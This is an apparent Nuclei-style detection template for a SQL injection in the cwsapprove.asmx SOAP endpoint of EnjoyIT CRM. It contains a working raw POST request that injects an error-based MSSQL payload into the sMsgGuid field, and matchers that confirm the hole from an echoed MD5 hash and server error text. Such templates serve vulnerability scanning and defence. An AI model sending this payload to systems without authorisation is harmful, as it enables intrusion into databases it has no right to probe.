folder-5/poc-yaml-enjoyit-crm-cwsapprove-asmx-sqli.yaml

id: poc-yaml-enjoyit-crm-cwsapprove-asmx-sqli
info:
  name: EnjoyIT CRM cwsapprove.asmx SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template identifies a SQL injection vulnerability in the cwsapprove.asmx endpoint of the EnjoyIT CRM application.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /EnjoyRMIS_WS/WS/Approve/cwsapprove.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Soapaction: "http://tempuri.org/EndBillApprove1"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <EndBillApprove1 xmlns="http://tempuri.org/">
              <sMsgGuid>' AND 9173 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')))) AND 'rhYc'='rhYc</sMsgGuid>
              <sUserno>string</sUserno>
              <sEformDataIp>string</sEformDataIp>
            </EndBillApprove1>
          </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "{{t2}}"
          - "服务器无法处理请求"
          - "转换成数据类型"
      - type: word
        part: header
        words:
          - "text/xml"
